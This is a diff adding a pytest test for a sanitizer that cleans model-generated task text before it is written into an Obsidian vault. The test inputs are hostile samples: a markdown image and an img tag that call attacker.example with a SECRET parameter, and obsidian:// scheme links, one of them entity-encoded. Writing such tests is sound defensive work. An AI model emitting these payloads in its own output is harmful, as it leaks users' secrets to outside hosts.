@@ -237,6 +237,18 @@ def test_model_text_cannot_run_plugin_code_or_forge_a_task(dr):
     assert len(dr._task_text("x" * 1000)) == dr.TASK_TEXT_MAX
 
 
+def test_model_text_cannot_load_a_remote_image_or_carry_a_scheme(dr):
+    """F-20261020 5278613 (work-D/repro_drift.py): the task line is opened in
+    the vault, so the sanitizer runs before the ingest guard."""
+    z = "\u200b"
+    assert dr._task_text("![x](https://attacker.example/p?d=SECRET)") == \
+        "!" + z + "[x](https://attacker.example/p?d=SECRET)"
+    assert dr._task_text('<img src="https://attacker.example/t.gif">') == \
+        "<" + z + 'img src="https://attacker.example/t.gif">'
+    assert dr._task_text("see [o](obsidian://open?file=x)") == "see [o](obsidian" + z + "://open?file=x)"
+    assert dr._task_text("see [o](obsidia&#110;://open)") == "see [o](obsidia&#" + z + "110;" + z + "://open)"
+
+
 def test_a_second_section_appends_and_keeps_the_first(dr, tmp_path):
     note = tmp_path / "Drift Review.md"
     dr.append_tasks(note, "2026-10-06 a..b", ["- [ ] #task one"])
